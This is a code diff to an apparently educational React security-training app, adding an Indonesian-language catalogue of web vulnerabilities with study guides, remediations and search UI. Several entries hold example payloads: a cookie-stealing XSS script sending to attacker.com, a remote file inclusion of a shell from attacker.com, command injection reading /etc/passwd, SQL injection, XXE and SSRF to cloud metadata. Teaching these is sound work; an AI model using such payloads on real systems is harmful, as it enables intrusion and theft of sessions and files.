@@ -442,6 +442,371 @@ interface ChatMessage {
   timestamp: string;
 }
 
+interface VulnerabilityItem {
+  title: string;
+  engTitle?: string;
+  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
+  owasp: string;
+  description: string;
+  example: string;
+  remediation: string;
+  relatedLessonId?: string;
+}
+
+interface MasterCategory {
+  id: string;
+  number: number;
+  name: string;
+  description: string;
+  tutorialTitle: string;
+  studyGuide: string;
+  items: VulnerabilityItem[];
+}
+
+const vulnerabilityCategoriesList: MasterCategory[] = [
+  {
+    id: "cat-1",
+    number: 1,
+    name: "Kerentanan Injeksi & Eksekusi Kode (Injection & Code Execution)",
+    description: "Celah di mana input pengguna ditafsirkan sebagai kode perintah (script/query) secara ilegal oleh interpreter backend server atau browser korban.",
+    tutorialTitle: "Panduan Belajar Injeksi & Code Execution",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Pahami Arsitektur Interpreter:** Pelajari perbedaan fundamental antara string teks mentah biasa dengan baris instruksi program. Mesin database (SQL), mesin template (SSTI), shell OS (RCE), dan parser browser (XSS) semuanya mengevaluasi string input menjadi instruksi aktif jika tidak disanitasi.\n2. **Gunakan PortSwigger Web Security Academy:** Selesaikan lab gratis di PortSwigger untuk topik *SQL Injection*, *Cross-Site Scripting (XSS)*, dan *OS Command Injection*. Ini adalah pondasi terkuat.\n3. **Praktik Mandiri via Docker:** Unduh DVWA (Damn Vulnerable Web Application) atau OWASP Juice Shop menggunakan Docker. Latih bypass filter (WAF evasion) dari level Low, Medium, hingga High.\n4. **Alat Bantu Utama:** Pelajari tool otomatisasi populer seperti \`sqlmap\` (untuk SQLi), \`Burp Suite Interceptor\` untuk manipulasi request, dan kumpulan payload di Github *PayloadsAllTheThings*.",
+    items: [
+      {
+        title: "Server-side Remote Code Execution (RCE)",
+        engTitle: "RCE",
+        severity: "CRITICAL",
+        owasp: "A03:2021-Injection",
+        description: "Celah fatal di mana penyerang dapat mengeksekusi perintah sistem operasi (shell/OS commands) langsung ke dalam terminal server target.",
+        example: "Parameter URL ping diimbuhi interkoneksi bash: ping?host=8.8.8.8 && cat /etc/passwd",
+        remediation: "Hindari fungsi evaluasi system shell langsung (e.g., exec, system, shell_exec). Gunakan parser library bawaan bahasa pemrograman yang aman untuk argument passing.",
+        relatedLessonId: "p3-l2"
+      },
+      {
+        title: "SQL Injection",
+        engTitle: "SQLi",
+        severity: "CRITICAL",
+        owasp: "A03:2021-Injection",
+        description: "Injeksi query SQL dinamis tidak aman di mana input pengguna digabungkan secara langsung (string concatenation) sebelum dikirim ke mesin database siber, memicu pembacaan atau penghapusan data sepihak.",
+        example: "Melakukan bypass otentikasi login dengan memasukkan karakter kuis siber: ' OR '1'='1 ke kolom username/login password.",
+        remediation: "Gunakan fitur Prepared Statement (Parameterized Query) tanpa pengecualian, hindari query dinamis manual, serta batasi hak akses akun database ke tingkat minimum (least privilege).",
+        relatedLessonId: "p3-l1"
+      },
+      {
+        title: "Cross-site Scripting (XSS)",
+        engTitle: "XSS",
+        severity: "HIGH",
+        owasp: "A03:2021-Injection",
+        description: "Celah keamanan di mana naskah berbahaya (HTML/JavaScript) disisipkan ke sistem aplikasi web tepercaya yang kemudian dieksekusi di peramban browser korban. Terdiri dari Stored (tersimpan di server), Reflected (terpantul di link), dan DOM-based (cacat olahan Javascript client).",
+        example: "Injeksi script pencurian cookie di dalam input komentar: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
+        remediation: "Lakukan kontekstual output encoding (sanitasi output), batasi karakter input, serta terapkan pertahanan berlapis dengan Content Security Policy (CSP).",
+        relatedLessonId: "p2-l1"
+      },
+      {
+        title: "Server Side Template Injection (SSTI)",
+        engTitle: "SSTI",
+        severity: "HIGH",
+        owasp: "A03:2021-Injection",
+        description: "Injeksi sintaks pemrograman ke dalam mesin pemroses template (Template Engine) backend server seperti Jinja, Freemarker, atau Twig, sering kali berujung pada eksploitasi Remote Code Execution (RCE).",
+        example: "Memasukkan ekspresi matematika siber ke dalam isian formulir nama profil template: {{ 7*7 }} yang menghasilkan tampilan evaluasi server berupa angka 49 di profil.",
+        remediation: "Sanitasi input sebelum diteruskan ke fungsi rendering template, terapkan pemrosesan berkas di lingkungan sandbox ketat (sandboxed context), atau gunakan format rendering statis yang aman."
+      },
+      {
+        title: "XML External Entity Attacks (XXE)",
+        engTitle: "XXE",
+        severity: "HIGH",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Serangan yang memanfaatkan kelemahan parser XML saat membaca file konfigurasi berbasis entitas eksternal yang diatur longgar, mengizinkan pembacaan file server lokal hingga pemindaian port port internal.",
+        example: "Mengirim payload XML dengan entitas sistem mengarah ke file sistem berkas: <!ENTITY xxe SYSTEM 'file:///etc/passwd'> di dalam bagian data POST request.",
+        remediation: "Matikan fitur resolusi entitas eksternal (External Entities / DTD) sepenuhnya pada seluruh XML Parser yang digunakan pada ekosistem kode."
+      },
+      {
+        title: "Prototype Pollution",
+        engTitle: "Prototype Pollution",
+        severity: "HIGH",
+        owasp: "A03:2021-Injection",
+        description: "Celah spesifik pada ekosistem JavaScript (Node.js) di mana penyerang mampu memodifikasi properti dari prototipe dasar objek global (__proto__ atau constructor.prototype), merusak logika aplikasi atau memicu RCE.",
+        example: "Mengirimkan input payload JSON bermuatan polusi properti: JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')",
+        remediation: "Gunakan Object.create(null) untuk instansiasi objek bebas prototipe dasar, validasi ketat struktur JSON dengan JSON Schema, dan gunakan deep-merge library yang kebal terhadap polusi."
+      }
+    ]
+  },
+  {
+    id: "cat-2",
+    number: 2,
+    name: "Kegagalan Otorisasi & Kontrol Akses (Access Control & Authorization)",
+    description: "Kegagalan sistem dalam menegakkan batasan hak akses pengguna, memicu akses atau manipulasi data milik piranti akun pengguna lain secara ilegal.",
+    tutorialTitle: "Panduan Belajar Access Control & Otorisasi",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Pahami Autentikasi vs Otorisasi:** Autentikasi membuktikan jati diri user, sedangkan Otorisasi menentukan apa hak aktivitasnya. Masalah otorisasi terjadi ketika user berhasil login tetapi mampu mengakses menu user lain.\n2. **Selesaikan Lab PortSwigger Access Control:** Fokuslah pada lab terkait *Insecure Direct Object References (IDOR)*, horizontal bypass, dan vertical privilege escalation.\n3. **Amati Pola API pada Burp Suite:** Amati id unik, parameters, JWT token pada HTTP Request. Ganti ID milik Anda dengan ID acak milik orang lain saat memproses transaksi dan perhatikan responnya.\n4. **Otorisasi Sisi Server:** Sadari bahwa menyembunyikan tombol 'Admin' di Client UI menggunakan CSS/JS tidak mengamankan API backend yang sebenarnya.",
+    items: [
+      {
+        title: "Access Control Issues / Broken Access Control",
+        engTitle: "BAC",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Kegagalan penegakan aturan akses siber di tingkat rute, memampukan pengguna tak terotorisasi mengeksekusi fungsionalitas admin atau user lain.",
+        example: "Akses manual ke rute admin langsung via browser: https://target.com/api/v1/admin/delete-account?id=12",
+        remediation: "Paksa penegakan aturan hak akses secara ketat di sisi server untuk setiap rute API, gunakan role-based access control (RBAC)."
+      },
+      {
+        title: "Insecure Direct Object Reference (IDOR)",
+        engTitle: "IDOR",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Kegagalan implementasi otorisasi di mana aplikasi menyajikan akses ke sumber data sensitif hanya berdasarkan ID objek langsung (misal parameter URL), tanpa melakukan verifikasi kepemilikan sesi akun pengguna.",
+        example: "Mengganti parameter customer ID di URL akun profil untuk melihat kwitansi pengguna lain: http://target-app.com/invoice?id=1002 diubah langsung ke id=1001.",
+        remediation: "Gunakan identifikasi berbasis sesi terenkripsi atau token JWT yang kokoh, gunakan UUID acak daripada urutan angka id increment, dan selalu lakukan pemeriksaan otorisasi tumpang-tindih di server.",
+        relatedLessonId: "p3-l3"
+      },
+      {
+        title: "BOLA (Broken Object Level Authorization)",
+        engTitle: "BOLA / IDOR on API",
+        severity: "HIGH",
+        owasp: "API1:2019-Broken Object Level Authorization",
+        description: "Varian IDOR di lingkungan API modern (REST/GraphQL) di mana objek diidentifikasi oleh parameter pengenal yang rentan dimanipulasi tanpa cek otorisasi berlapis.",
+        example: "Mengambil data rekam medis pasien lain via API: GET /api/v1/patients/3309/records menggunakan JWT milik pasien nomor ID 9012.",
+        remediation: "Pastikan server memvalidasi kepemilikan objek: periksa apakah userId di session / JWT aktif saat ini adalah pemilik sah dari objekID yang sedang dipanggil."
+      },
+      {
+        title: "BFLA (Broken Function Level Authorization)",
+        engTitle: "BFLA",
+        severity: "HIGH",
+        owasp: "API2:2019-Broken Function Level Authorization",
+        description: "Pengguna biasa yang mampu mengeksekusi fungsi atau endpoint milik administrator karena kurangnya validasi level peran (role-level verification).",
+        example: "Mengakses endpoint CRUD administratif: POST /api/v1/admin/update-settings dengan token otentikasi user ber-role tamu (Guest).",
+        remediation: "Terapkan middleware otorisasi deklaratif terpusat yang memverifikasi kecocokan role pengguna sebelum memproses muatan logika kontrol sensitif."
+      }
+    ]
+  },
+  {
+    id: "cat-3",
+    number: 3,
+    name: "Kerentanan Alur Logika Bisnis (Business Logic Vulnerabilities)",
+    description: "Cacat desain pada alur transaksi atau proses fungsional aplikasi (bukan kesalahan sintaks kode) yang dipelintir penyerang untuk merusak kalkulasi bisnis.",
+    tutorialTitle: "Panduan Belajar Celah Logika Bisnis",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Kembangkan Mindset Eksploratif:** Bertanyalah di setiap fitur: 'Bagaimana jika saya mengirimkan request ini 100x dalam satu detik? Bagaimana jika harga barang saya ganti menjadi minus (-)?'. Celah logika bisnis menuntut imajinasi liar peretas.\n2. **Kuasai Modul PortSwigger Business Logic:** Selesaikan semua lab terkait pemakaian kupon diskon berulang, otorisasi transaksi, pemotongan harga ilegal, dan bypass validasi langkah checkout.\n3. **Analisis Multi-Request dengan Burp:** Gunakan alat \`Burp Intruder\` atau fitur \`Turbo Intruder\` untuk mengirim rentetan request paralel guna memicu inkonsistensi data di sisi server.",
+    items: [
+      {
+        title: "Race Condition",
+        engTitle: "Race Condition",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Eksploitasi jeda waktu pemrosesan server untuk mengeksekusi beberapa permintaan secara bersamaan (misal: mencairkan satu voucer atau saldo berkali-kali dalam satu milidetik sebelum database mencatatnya).",
+        example: "Mengaktifkan redeem voucher diskon Rp10.000 sebanyak 20 kali secara serempak di milidetik yang sama sehingga saldo bertambah Rp200.000 padahal kode voucher yang sama sudah kedaluwarsa.",
+        remediation: "Terapkan Transaction Isolation Level (seperti Serializable), pasang mutex lock siber pada tabel relasional basis data, atau manfaatkan fitur distributed lock berbasis Redis.",
+        relatedLessonId: "p4-l2"
+      },
+      {
+        title: "Parameter / ID Tampering pada Transaksi",
+        engTitle: "Transaction Tampering",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Memanipulasi parameter krusial transaksi seperti harga, kuantitas, atau mata uang dalam request payload sebelum dikirim ke backend server.",
+        example: "Mengedit price tag di request payload belanjaan: mengubah param { \"price\": 1000000 } menjadi { \"price\": 100 } saat melakukan checkout produk.",
+        remediation: "Larang keras menerima harga produk dari client-side request. Selalu query harga resmi produk di sisi server berdasarkan catalog database saat menghitung total tagihan.",
+        relatedLessonId: "p4-l2"
+      },
+      {
+        title: "Flaw pada Fitur Reset Password",
+        engTitle: "Reset Password Flaw",
+        severity: "HIGH",
+        owasp: "A07:2021-Identification and Authentication Failures",
+        description: "Inkonsistensi logika pada alur pengubahan sandi (e.g., token reset terprediksi, token bocor di respons server, atau token reset tidak di-invalidate setelah dipakai).",
+        example: "Mengubah parameter email korban di URL reset password: /reset?token=XYZ&user=korban@cool.com sedangkan token aslinya dicocokkan untuk akun attacker.",
+        remediation: "Gunakan token reset acak (cryptographically secure), tetapkan batas kedaluwarsa token pendek (misal 15 menit), pastikan token langsung hangus setelah sekali pakai, dan validasi sesi pengguna."
+      }
+    ]
+  },
+  {
+    id: "cat-4",
+    number: 4,
+    name: "Pemalsuan Permintaan Sisi Server & Klien (Request Forgery)",
+    description: "Celah manipulasi siber yang memaksa server / internet internal melakukan koneksi ke luar, atau memaksa browser korban beraksi ilegal.",
+    tutorialTitle: "Panduan Belajar Request Forgery (SSRF & CSRF)",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Pahami Cara Kerja Session Cookies:** Pelajari bagaimana browser melampirkan cookie secara otomatis ke situs asal pada setiap request (pondasi CSRF).\n2. **Kuasai Skenario Hubungan Server Outbound:** Pelajari bagaimana server menarik gambar profil, web preview, atau tautan webhook ke database internal (pondasi SSRF).\n3. **Pelajari Lab PortSwigger SSRF & CSRF:** Ini adalah program paling populer bagi Bug Hunter karena SSRF di lingkungan cloud (AWS/GCP) berhadiah sangat besar ($5,000+).\n4. **Gunakan Out-of-Band Tools:** Gunakan platform eksternal seperti \`Collaborator (Burp)\`, \`Interactsh\`, atau \`Webhook.site\` untuk memantau callback koneksi saat menguji SSRF.",
+    items: [
+      {
+        title: "Server-Side Request Forgery",
+        engTitle: "SSRF",
+        severity: "HIGH",
+        owasp: "A10:2021-Server-Side Request Forgery",
+        description: "Celah di mana penyerang mampu memanipulasi aplikasi server untuk menginisiasi koneksi/request HTTP keluar (outbound) ke sumber daya internal yang berwenang tinggi atau server eksternal lain.",
+        example: "Meminta server mengunduh gambar profil dari URL metadata sensitif di cloud provider: http://target-app.com/preview?url=http://169.254.169.254/latest/meta-data/",
+        remediation: "Lakukan validasi ketat/whitelist pada domain atau IP tujuan, blokir akses langsung ke alamat loopback IP (127.0.0.1) dan internal subnet range, serta batasi skema protokol URL hanya untuk HTTP/HTTPS.",
+        relatedLessonId: "p4-l1"
+      },
+      {
+        title: "Cross-site Request Forgery",
+        engTitle: "CSRF",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Serangan yang memaksa browser korban yang telah terautentikasi mengirimkan HTTP request yang tidak diinginkan/direncanakan ke halaman web sasaran tanpa sepengetahuannya.",
+        example: "Sebuah link gambar tersembunyi yang otomatis memicu transfer dana saat memuat halaman: <img src='http://bank.com/transfer?amount=1000&to=attacker' width='0' height='0' />",
+        remediation: "Implementasikan token anti-CSRF unik yang divalidasi ketat pada setiap request berbasis perubahan state (POST/PUT/DELETE) serta gunakan atribut SameSite=Strict pada Cookie.",
+        relatedLessonId: "p2-l2"
+      },
+      {
+        title: "HTTP Request Smuggling",
+        engTitle: "Request Smuggling",
+        severity: "HIGH",
+        owasp: "A03:2021-Injection",
+        description: "Manipulasi ketidaksesuaian interpretasi panjang pesan (Content-Length vs Transfer-Encoding) antara Reverse Proxy dengan Backend Server untuk menyelundupkan request ilegal milik user lain.",
+        example: "Pengiriman request ganda bermuatan pemisah baris siber yang menjebak parser CDN sehingga membiarkan request kedua dibaca sebagai header request milik user di antrean berikutnya.",
+        remediation: "Terapkan HTTP/2 secara menyeluruh dari frontend proxy hingga backend server, matikan pemrosesan TE (Transfer-Encoding) jika tidak mutlak diperlukan."
+      }
+    ]
+  },
+  {
+    id: "cat-5",
+    number: 5,
+    name: "Celah Keamanan Infrastruktur, Cloud, & Subdomain",
+    description: "Kelonggaran konfigurasi dan pembiaran celah keamanan pada tingkat orkestrasi server, DNS, media penyimpanan awan, dan pipeline integrasi tim pengembang.",
+    tutorialTitle: "Panduan Belajar Keamanan Infrastruktur & Cloud",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Kuasai DNS Fundamentals:** Pahami peran tipe record DNS seperti CNAME, A Record, MX, dan TXT. Hubungan antara nama subdomain mati dengan asset eksternal adalah kunci utama pencarian Subdomain Takeover.\n2. **Pelajari AWS/GCP CLI & IAM:** Pelajari bagaimana memori bucket AWS S3 dikonfigurasi. Latih kemampuan meraba permission bucket dengan perintah awam CLI: \`aws s3 ls s3://target-bucket\`.\n3. **Reconnaissance (Recon) Aktif:** Kuasai teknik pemindaian subdomain menggunakan tools andal seperti \`subfinder\`, \`massdns\`, atau \`amass\`, lalu kroscek status responnya (e.g. 404 Not Found).\n4. **Analisis CI/CD & GitHub Workflow:** Pelajari cara membaca arsitektur pipeline konfigurasi (.github/workflows) dan cari kelemahan pengarsipan token / password di dalamnya.",
+    items: [
+      {
+        title: "Subdomain Takeover",
+        engTitle: "Subdomain Takeover",
+        severity: "HIGH",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Mengambil alih subdomain mati milik target karena DNS pointer (CNAME Record) masih mengarah ke penyedia hosting luar (e.g. Github Page, AWS S3, Shopify) yang jasanya sudah dilepas atau kedaluwarsa.",
+        example: "Subdomain dev.target.com memiliki CNAME mengarah ke myapps.github.io. Akun myapps di Github dihapus, penyerang mendaftarkan akun myapps untuk merebut domain dev.target.com.",
+        remediation: "Lakukan audit DNS Record secara kontinu, segera bersihkan (delete) record DNS CNAME jika layanan hosting pihak ketiga terkait sudah dimatikan."
+      },
+      {
+        title: "Insecure Storage Buckets / Misconfiguration",
+        engTitle: "Public S3 Bucket Leak",
+        severity: "MEDIUM",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Kebocoran data sensitif akibat kelalaian konfigurasi pada media penyimpanan awan (AWS S3, Google Cloud Storage) yang diatur terbuka untuk umum tanpa token.",
+        example: "Akses folder backup database siber sensitif di bucket publik: https://target-db-backup.s3.amazonaws.com/ yang dapat dibaca bebas tanpa login.",
+        remediation: "Aktifkan kebijakan Block Public Access di tingkat bucket secara menyeluruh, kelola restriksi akses menggunakan IAM Policy tersertifikasi keras."
+      },
+      {
+        title: "CI/CD Pipeline & Supply Chain Attacks",
+        engTitle: "CI/CD Token Leak",
+        severity: "HIGH",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Kebocoran token integrasi kode atau rahasia token pembangunan di file konfigurasi CI/CD otomatisasi build (.yml) yang memberi akses manipulasi core codebase.",
+        example: "Token AWS atau github developer token terekspos karena tertulis keras (hardcoded) di logs publik run actions.",
+        remediation: "Simpan semua token sensitif di dalam Github Secrets Vault atau AWS KMS. Gunakan rotasi token otomatis berkala."
+      },
+      {
+        title: "Exposed Administrative Panels",
+        engTitle: "Exposed Admin",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Adanya gerbang kontrol administratif (admin console / dashboard) yang terbuka bebas ke publik tanpa pembatasan IP kaku dan tidak memaksakan verifikasi login kredensial terotentikasi.",
+        example: "Akses langsung ke URL sensitif admin console via port khusus: http://target-app.com:8080/admin/main-console tanpa diminta kredensial keamanan siber apa pun.",
+        remediation: "Terapkan perlindungan ketat dengan filter IP Whitelist (IP VPN internal saja), gunakan multi-factor authentication (MFA), siberkan logging, serta matikan atau sembunyikan rute adminsitratif tak terpakai.",
+        relatedLessonId: "p4-l1"
+      },
+      {
+        title: "Misconfiguration issues on servers and applications",
+        engTitle: "Misconfiguration",
+        severity: "MEDIUM",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Kelonggaran pengaturan sistem, penggunaan konfigurasi default bawaan pabrik, pengaktifan directory listing publik, pesan kesalahan error penuh debug, hingga port tak perlu yang diabaikan terbuka.",
+        example: "Pesan kegagalan sistem yang merinci arsitektur backend internal (stack trace / source code snippet) saat dipanggil oleh input cacat.",
+        remediation: "Hapus modul pengujian tak tepercaya, matikan pendeteksian stack trace (pajang generic error page), dan kunci konfigurasi framework dengan prinsip hardening ketat sebelum dipindahkan ke lini produksi.",
+        relatedLessonId: "p4-l2"
+      }
+    ]
+  },
+  {
+    id: "cat-6",
+    number: 6,
+    name: "Kegagalan Otentikasi & Pengelolaan Sesi (Authentication & Sessions)",
+    description: "Kelemahan arsitektur pembuatan token, mitigasi logout, orkestrasi pertukaran identitas (OAuth), atau izin silang (CORS) yang merugikan kerahasiaan login korban.",
+    tutorialTitle: "Panduan Belajar Autentikasi & Pengelolaan Sesi",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Pahami Cara Kerja JWT vs Session:** Pelajari struktur JWT yang terdiri dari Header, Payload, dan Signature. Buat token JWT buatan sendiri di \`jwt.io\` untuk memahami cara memvalidasi integritas tanda tangannya.\n2. **Pelajari Alur Kerja OAuth 2.0:** Pahami konsep token tukar (Authorization Code) dan bahaya kebocoran token di URL / browser history.\n3. **Kuasai CORS Header:** CORS bukan perlindungan keamanan, melainkan kebijakan perizinan berbagi data lintas asal. Pahami header kritis seperti \`Access-Control-Allow-Origin\` dan \`Access-Control-Allow-Credentials\`.\n4. **Selesaikan Lab PortSwigger Terkait:** Selesaikan tantangan kuis di modul *Authentication*, *OAuth Authentication*, dan *CORS*.",
+    items: [
+      {
+        title: "Significant Authentication Bypass",
+        engTitle: "Auth Bypass",
+        severity: "CRITICAL",
+        owasp: "A07:2021-Identification and Authentication Failures",
+        description: "Kelemahan logika otentikasi fatal yang mengizinkan pihak penyerang melewati modul login, memalsukan identitas pengguna lain, atau mengeksploitasi cacat token JWT tanpa memasukkan kredensial yang valid.",
+        example: "Menggunakan JWT dengan kolom algoritma diatur ke 'none' untuk memaksa server mengakui keaslian modifikasi payload palsu tanpa tanda tangan verifikasi.",
+        remediation: "Terapkan pustaka otentikasi standar industri (seperti bcrypt/Argon2), jangan pernah biarkan algoritma 'none' pada parser JWT, gunakan verifikasi tanda tangan asimetris, dan validasi seluruh proses otentikasi di level server."
+      },
+      {
+        title: "OAuth Misconfiguration",
+        engTitle: "OAuth Leak",
+        severity: "HIGH",
+        owasp: "A07:2021-Identification and Authentication Failures",
+        description: "Salah pengaturan implementasi Social Login (seperti Google/FB login) di mana parameter redirect_uri tidak dikendalikan dengan whitelist statis, memicu pencurian token authorization code.",
+        example: "Mengubah parameter callback rute login: redirect_uri=https://evil-site.com/steal-token, menangkap token kode akses login milik pengguna secara otomatis.",
+        remediation: "Pastikan server mengonfirmasi penargetan callback URL secara statis kaku (Exact String Match), tolak wildcard regex pendaftaran domain luar."
+      },
+      {
+        title: "CORS Misconfiguration (Cross-Origin Resource Sharing)",
+        engTitle: "CORS Misconfig",
+        severity: "HIGH",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Konfigurasi header CORS yang longgar, memperbolehkan pihak ketiga membaca konten situs secara dinamik di browser korban sembari mengikutsertakan session cookie terotorisasi.",
+        example: "Server merespons request dengan header longgar: Access-Control-Allow-Origin: http://evil.com/ dan Access-Control-Allow-Credentials: true.",
+        remediation: "Hindari penggunaan origin pencerminan otomatis atau wildcard (*) jika credentials diaktifkan. Gunakan sistem whitelist domain kaku."
+      }
+    ]
+  },
+  {
+    id: "cat-7",
+    number: 7,
+    name: "Kebocoran Informasi & File Akses (Information Disclosure & File Access)",
+    description: "Kegagalan pencegahan pembacaan berkas lokal, pengeksposan kredensial di dalam bundel client side, atau kelonggaran parsing properti database yang melanggar privasi.",
+    tutorialTitle: "Panduan Belajar File Access & Information Disclosure",
+    studyGuide: "### 💡 Cara Belajar Praktis & Langkah Menguasai:\n1. **Kuasai Teknik Penelusuran Direktori (Path Traversal):** Pahami hierarki direktori sistem operasi Linux (\`/etc/passwd\`, \`/var/www/html/\`) dan Windows (\`C:\\Windows\\win.ini\`).\n2. **Kembangkan Kepekaan Membaca Source Code (Code Review):** Latih diri Anda membaca tumpukan berkas JavaScript publik di tab *Sources* Developer Tools browser (Ctrl+Shift+I). Cari petunjuk API Keys, URL backend internal, dan file peta rute (.map) yang terlupa dihapus.\n3. **Pelajari Mass Assignment:** Pahami bagaimana ORM (seperti Prisma, Sequelize, Hibernate) memproses input model secara massal dari JSON request body.\n4. **Selesaikan Lab PortSwigger Terkait:** Selesaikan tantangan praktis di PortSwigger modul *Directory Traversal* dan *Information Disclosure*.",
+    items: [
+      {
+        title: "Information disclosure of Sensitive Information",
+        engTitle: "Info Disclosure",
+        severity: "MEDIUM",
+        owasp: "A05:2021-Security Misconfiguration",
+        description: "Kebocoran data rahasia perusahaan, dokumentasi API internal, kredensial konfigurasi, repositori kode, atau riwayat uji coba sistem yang terperangkap terekspos di area publik.",
+        example: "Berkas sistem backup teratur .git/ atau .env yang terlupa dibatasi aksesnya dan dapat diunduh bebas melalui perambah browser di alamat akar aplikasi web.",
+        remediation: "Atur file konfigurasi sistem .htaccess atau Nginx blocks untuk melarang pembacaan berkas tersembunyi, bersihkan komentar developer yang bocor di Client CSS/HTML, serta lakukan pemantauan kerentanan siber berkala."
+      },
+      {
+        title: "Leaked Private Keys / Credentials",
+        engTitle: "Leaked Keys",
+        severity: "CRITICAL",
+        owasp: "A02:2021-Cryptographic Failures",
+        description: "Kebocoran kunci privat kriptografis terenkripsi (SSH Key, API Gmaps key, AWS configuration secret, SSL certificate privat) di luar domain tertutup atau diunggah ke repositori publik.",
+        example: "Kunci akses AWS Secret Key yang tertulis keras (hardcoded) secara publik ke dalam baris penulisan kode JavaScript di repositori berantai GitHub.",
+        remediation: "Simpan seluruh kunci akses penting ke dalam Server-side Environment Variables aman (seperti .env), gunakan perkakas pengelola rahasia (HashiCorp Vault / Secret Manager), serta lakukan rotasi kunci berkala."
+      },
+      {
+        title: "Directory Traversal / Local File Disclosure (LFD)",
+        engTitle: "Directory Traversal",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Celah yang mengizinkan pembacaan berkas lokal di luar direktori root web aplikasi dengan memanipulasi parameter pengarah direktori jalur file (misal menggunakan kombinasi mundur ../).",
+        example: "Meminta berkas sistem kritis melalui input parameter render dinamis: http://target-app.com/view?file=../../../../etc/passwd.",
+        remediation: "Hindari menerima input jalur file langsung dari luar. Gunakan array index ter-whitelist untuk merujuk file, atau jalankan sanitas jalur yang melucuti karakter mundur pengganti direktori."
+      },
+      {
+        title: "Local/Remote File Inclusion (LFI/RFI)",
+        engTitle: "LFI/RFI",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "Celah pemuatan siber yang membolehkan file lokal atau file skrip eksternal (RFI) disematkan ke dalam runtime interpreter bahasa (misal PHP include()) untuk segera dijalankan.",
+        example: "Pemuatan file siber asing dari shell attacker jarak jauh ke dalam skrip index backend: http://target-app.com/index.php?page=http://attacker.com/malicious_shell.txt",
+        remediation: "Nonaktifkan pengaturan allow_url_include dan allow_url_fopen pada konfigurasi PHP, gunakan pencocokan statis berbasis whitelist berkas yang sah, dan jangan sertakan input eksternal secara langsung ke penentu require/include pemrograman."
+      },
+      {
+        title: "Mass Assignment / Improper Mass Assignment",
+        engTitle: "Mass Assignment",
+        severity: "HIGH",
+        owasp: "A01:2021-Broken Access Control",
+        description: "API secara mentah langsung memetakan parameter data JSON input pencatat ke database record tanpa batasan fields, membiarkan client-side request memperbarui fields istimewa.",
+        example: "Mengirimkan request pengubahan profil user biasa namun menyisipkan key parameter administratif: { \"username\": \"alex\", \"is_admin\": true }",
+        remediation: "Gunakan Data Transfer Objects (DTO) untuk menyaring payload input, atau setel attribute pelindung 'readonly' / whitelist properti database yang boleh diperbarui secara publik."
+      }
+    ]
+  }
+];
+
 export default function App() {
   // Gamification States
   const [xp, setXp] = useState<number>(() => {
@@ -475,6 +840,11 @@ export default function App() {
   const [labErrorMsg, setLabErrorMsg] = useState<string | null>(null);
   const [activeHint, setActiveHint] = useState<string | null>(null);
 
+  // Voucher/Vulnerabilities Directory States
+  const [vulnSearchQuery, setVulnSearchQuery] = useState<string>('');
+  const [vulnSeverityFilter, setVulnSeverityFilter] = useState<string>('ALL');
+  const [expandedVuln, setExpandedVuln] = useState<string | null>(null);
+
   // Chat integration with CyberMentor AI
   const [chatMessages, setChatMessages] = useState<ChatMessage[]>(() => {
     const saved = localStorage.getItem('cybermentor_chat');
@@ -491,10 +861,31 @@ export default function App() {
   const [isAITyping, setIsAITyping] = useState<boolean>(false);
 
   // Layout states
-  const [activeTab, setActiveTab] = useState<'lecture' | 'sandbox'>('lecture');
+  const [activeTab, setActiveTab] = useState<'lecture' | 'sandbox' | 'vulnerabilities'>('lecture');
   const [terminalTheme, setTerminalTheme] = useState<'matrix' | 'dracula' | 'cyberpunk'>('matrix');
 
   const currentLesson = lessonsList.find(l => l.id === activeLessonId) || lessonsList[0];
+
+  // State for expanded tutorial sections of each vulnerability category
+  const [expandedTutorialCategory, setExpandedTutorialCategory] = useState<string | null>(null);
+
+  const filteredCategories = vulnerabilityCategoriesList.map(cat => {
+    const matchedItems = cat.items.filter(vuln => {
+      const matchesSearch = vuln.title.toLowerCase().includes(vulnSearchQuery.toLowerCase()) ||
+                            (vuln.engTitle && vuln.engTitle.toLowerCase().includes(vulnSearchQuery.toLowerCase())) ||
+                            vuln.description.toLowerCase().includes(vulnSearchQuery.toLowerCase()) ||
+                            vuln.owasp.toLowerCase().includes(vulnSearchQuery.toLowerCase());
+      const matchesSeverity = vulnSeverityFilter === 'ALL' || vuln.severity === vulnSeverityFilter;
+      return matchesSearch && matchesSeverity;
+    });
+
+    return {
+      ...cat,
+      items: matchedItems
+    };
+  }).filter(cat => cat.items.length > 0);
+
+  const totalFilteredVulnerabilitiesCount = filteredCategories.reduce((acc, cat) => acc + cat.items.length, 0);
 
   const chatContainerRef = useRef<HTMLDivElement>(null);
 
@@ -1013,6 +1404,18 @@ export default function App() {
                 </div>
                 Lab Simulator & Sandbox
               </button>
+
+              <button
+                onClick={() => setActiveTab('vulnerabilities')}
+                className={`px-4 py-2 text-xs font-bold leading-none uppercase tracking-widest rounded-lg flex items-center gap-2 transition ${
+                  activeTab === 'vulnerabilities'
+                    ? 'bg-slate-900 border border-slate-800 text-white shadow-inner shadow-black'
